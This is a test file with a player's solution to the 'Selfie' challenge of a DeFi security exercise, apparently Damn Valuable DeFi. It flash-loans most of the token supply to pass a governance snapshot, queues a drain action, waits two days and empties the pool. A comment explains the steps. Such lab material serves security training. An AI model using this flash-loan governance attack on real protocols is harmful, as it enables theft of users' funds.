const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(token.address, pool.address, governance.address);
        await pool.connect(player).flashLoan(attacker.address, token.address, TOKENS_IN_POOL, "0x");
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await governance.connect(player).executeAction(1);

        /*
        Explanation:
        We can queue actions in the governance contract if we have more than half of the supply
        during the last snapshot taken.
        We flash loan 1.5M tokens (total supply is 2M).
        We take a snapshot.
        We queue an action which says "withdraw everything from the pool to ${player.address}".
        We wait 2 days.
        We execute the action.

        Plot holes:
        1. Should everyone be able to take a snapshot at any given moment?
        2. Word would get out that this exploit was happening and people would withdraw from the pool before 2 days.
        */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
